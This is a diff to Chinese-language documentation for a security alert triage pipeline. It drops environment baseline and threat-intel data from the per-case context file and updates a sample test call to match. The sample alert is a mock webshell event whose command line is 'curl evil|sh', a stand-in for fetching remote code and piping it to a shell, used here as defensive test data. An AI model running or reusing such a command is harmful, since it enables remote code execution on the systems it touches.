@@ -467,7 +467,7 @@ EOF
 | 顺序 | 做什么 | 依据 |
 | --- | --- | --- |
 | 1 | 先落一次盘 | `triage-monitor.js:365` |
-| 2 | 算上下文（同会话时间窗、基线、情报、历史结论） | `triage-monitor.js:370-371`、`triage-monitor.js:313-332` |
+| 2 | 算上下文（同会话时间窗、会话键、投递次数、历史结论；**不含**研判背景，见下§6.2 的说明） | `triage-monitor.js:370-371`、`triage-monitor.js:313-332` |
 | 3 | 关联牧云事件，阶段写「关联事件」 | `triage-monitor.js:372-374` |
 | 4 | 规则评估（只记步骤，不决定结论） | `triage-monitor.js:376-386` |
 | 5 | 写案件目录 | `triage-monitor.js:387-391` |
@@ -616,11 +616,13 @@ EOF
 | `01-原始告警.txt` | syslog 原始报文 | `syslog-case.js:103` |
 | `02-告警字段.md` | 消息时间、载荷格式，以及 `payload` 按键逐行展开的字段表 | `syslog-case.js:104` |
 | `03-研判事实.md` | 主机 IP、事件时间、来源、命令、文件路径、牧云匹配情况，外加牧云补充事件的 JSON | `syslog-case.js:105` |
-| `04-上下文.md` | 会话键、本条出现次数、投递次数、同会话时间窗，以及 `window`/`baseline`/`intel`/`history` 的 JSON | `syslog-case.js:106` |
+| `04-上下文.md` | 会话键、本条出现次数、投递次数、同会话时间窗，以及 `window`/`history` 的 JSON | `syslog-case.js:106` |
 | `03b-判据索引.md` | 只有传了 `wiki` 才有：本次可用判据的编号与标题 | `syslog-case.js:108-111` |
 | `06-必查项.json` | 研判收尾时由 `investigation-agent` 追加（P003-T040）：每项必查的 `status`/`evidence_id`/`returned_count`/`total_reported` 与前 5 行 `first_rows` | `syslog-case.js:179-207`、`investigation-agent.js:513-519` |
 
 字段表里的 `|` 会被转义、换行会被压成空格（`syslog-case.js:99-100`）。这几个材料文件并行写入，权限 `0o600`（`syslog-case.js:112-113`），函数返回 `{ case_dir, files }`（`syslog-case.js:114`）。
+
+**研判背景不进上下文（P003-T043）**：`04-上下文.md` 的 JSON 只剩 `window` 与 `history` 两段。原来那两段——`baseline`（测试工具路径 / 授权运维 / 白名单命令 / 预期来源国家）与 `intel`（按 IP 的情报缓存）——已经整体砍掉：监视器不再读 `<数据根>/baseline.json` / `<数据根>/intel.json`（`triage-monitor.js:899-916` 的 `contextFor` 只算会话键、时间窗、出现/投递次数与历史结论），环境基线改由模型按需经 `wiki_page` 读判据页 `GEN-13`（`common/GEN-13.md`），白名单命令的硬判定归规则层（`rules/*.rego` 与 `triage-rules.json` 规则集）。`server.js` 的 `runtimePaths()` 同步只剩 7 个具名路径，装配处也不再传 `baselineFile` / `intelFile`。
 
 `06-必查项.json` 不在 `writeSyslogCase` 里写：它依赖研判的必查项结果，由 `run()` 收尾时调 `writeRequiredEvidence()`
 （`syslog-case.js:187-207`）原子追加，并把文件名补进 `caseInfo.files`（`syslog-case.js:204`）。
@@ -641,7 +643,7 @@ import { rm } from 'node:fs/promises';
 import { writeSyslogCase, readCaseFile } from './syslog-case.js';
 await rm('/tmp/tp-case', { recursive: true, force: true });
 const parsed = { msgid: 'cloudwalker-webshell', ts: '2026-11-17T10:00:00Z', payload_format: 'keyvalue', payload: { host_ip: '10.0.0.5', source_ip: '1.2.3.4', event_create_time: '2026-11-17 18:00:00', event_name: 'webshell', process_command_line: 'curl evil|sh', file_path: '/tmp/a.php' } };
-const info = await writeSyslogCase({ directory: '/tmp/tp-case', raw: 'RAW-LINE', parsed, context: { occurrence_count: 2, delivery_count: 1, window: [{ at: 1 }], baseline: {}, intel: {}, history: [] }, match: { matched: true, alert_id: 'webshell:7', gap_seconds: 3, coverage: { exact_event_id: true, returned: 1, total: 1 }, event: { id: 7 } }, wiki: null });
+const info = await writeSyslogCase({ directory: '/tmp/tp-case', raw: 'RAW-LINE', parsed, context: { occurrence_count: 2, delivery_count: 1, window: [{ at: 1 }], history: [] }, match: { matched: true, alert_id: 'webshell:7', gap_seconds: 3, coverage: { exact_event_id: true, returned: 1, total: 1 }, event: { id: 7 } }, wiki: null });
 console.log('case_dir ->', info.case_dir);
 console.log('files ->', JSON.stringify(info.files));
 console.log('03-研判事实.md 首行 ->', (await readCaseFile(info, '03-研判事实.md')).content.split('\n')[0]);
